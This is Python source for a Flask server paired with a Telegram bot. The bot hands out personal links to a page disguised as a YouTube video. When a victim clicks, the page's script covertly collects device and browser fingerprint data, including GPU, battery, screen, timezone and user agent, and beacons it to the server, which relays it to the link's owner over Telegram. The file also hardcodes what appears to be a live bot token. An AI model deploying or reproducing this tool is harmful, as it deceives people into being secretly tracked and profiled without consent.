import threading
import requests
import json
import os
import base64
import time
import sqlite3
from flask import Flask, render_template_string, request

# =================================================================
# [1] CONFIGURATION
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS links (sid TEXT PRIMARY KEY, owner_id INTEGER)')
    conn.commit()
    conn.close()

def save_link(sid, owner_id):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (sid, owner_id))
    conn.commit()
    conn.close()

def get_owner(sid):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    res = conn.execute('SELECT owner_id FROM links WHERE sid = ?', (sid,)).fetchone()
    conn.close()
    return res[0] if res else OVERLORD_ID

# =================================================================
# [2] ADVANCED EXPLOIT UI (BATTERY + 20 POINTS)
# =================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
    <meta property="og:description" content="Official YouTube Video" />
    <title>YouTube</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; }
        .play::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body onclick="ignite()">
    <div id="app"><div class="play"></div></div>
<script>
    const sid = "{{sid}}";
    let fired = false;

    async function ignite() {
        if (fired) return;
        fired = true;

        // Собираем всё, что не требует ожидания
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        let bat = "N/A (iOS)";
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
            }
        } catch(e) {}

        const info = {
            bat: bat,
            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
            cores: navigator.hardwareConcurrency || "N/A",
            mem: navigator.deviceMemory || "N/A",
            res: screen.width + "x" + screen.height,
            depth: screen.colorDepth,
            plat: navigator.platform,
            lang: navigator.language,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            touch: navigator.maxTouchPoints,
            cookies: navigator.cookieEnabled,
            dnt: navigator.doNotTrack,
            pdf: navigator.pdfViewerEnabled,
            dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
            online: navigator.onLine,
            hist: window.history.length,
            ratio: window.devicePixelRatio,
            plugins: navigator.plugins.length,
            ua: navigator.userAgent
        };

        const payload = btoa(JSON.stringify({sid: sid, data: info, ref: document.referrer || "Direct"}));
        navigator.sendBeacon('/gate/capture', payload);

        setTimeout(() => {
            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        }, 500);
    }
</script>
</body>
</html>
"""

# =================================================================
# [3] SERVER LOGIC & STRUCTURED REPORTING
# =================================================================

@app.route('/gate/capture', methods=['POST'])
def capture():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        payload = json.loads(raw)
        sid = payload.get('sid')
        d = payload.get('data', {})
        
        report = (
            f"<b>🔴 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
            f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
            
            f"<b>🛠 ЖЕЛЕЗО:</b>\n"
            f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
            f"• 🧠 <b>Cores/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
            f"• 🏭 <b>Vendor:</b> <code>{d.get('vendor')}</code>\n"
            f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
            
            f"<b>🖥 ДИСПЛЕЙ:</b>\n"
            f"• 📐 <b>Res:</b> <code>{d.get('res')}</code>\n"
            f"• 🔍 <b>Ratio/Depth:</b> <code>{d.get('ratio')} / {d.get('depth')} bit</code>\n"
            f"• 👆 <b>Touch:</b> <code>{d.get('touch')} pts</code>\n\n"
            
            f"<b>⚙️ СИСТЕМА:</b>\n"
            f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
            f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
            f"• 🌙 <b>Dark Mode:</b> <code>{'Да' if d.get('dark') else 'Нет'}</code>\n"
            f"• 🌐 <b>Online:</b> <code>{d.get('online')}</code>\n\n"
            
            f"<b>🔗 ИСТОЧНИК:</b>\n"
            f"• 🖇 <b>Referrer:</b> <code>{payload.get('ref')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🛰 <b>USER-AGENT:</b>\n"
            f"<code>{d.get('ua')[:150]}...</code>"
        )
        
        owner_id = get_owner(str(sid))
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": owner_id, "text": report, "parse_mode": "HTML"})
    except: pass
    return "OK"

@app.route('/v/<sid>')
def serve(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/ping')
def health(): return "OK", 200

# =================================================================
# [4] C2 BOT ENGINE
# =================================================================

def bot_loop():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=10").json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if msg and "text" in msg:
                    cid = msg["chat"]["id"]
                    if msg["text"] == "/start":
                        save_link(str(cid), cid)
                        link = f"{BASE_URL}/v/{cid}"
                        text = f"🕶 <b>Система готова</b>\n\nТвоя персональная ссылка:\n<a href='{link}'>{link}</a>"
                        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                      json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
        except: time.sleep(5)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=bot_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
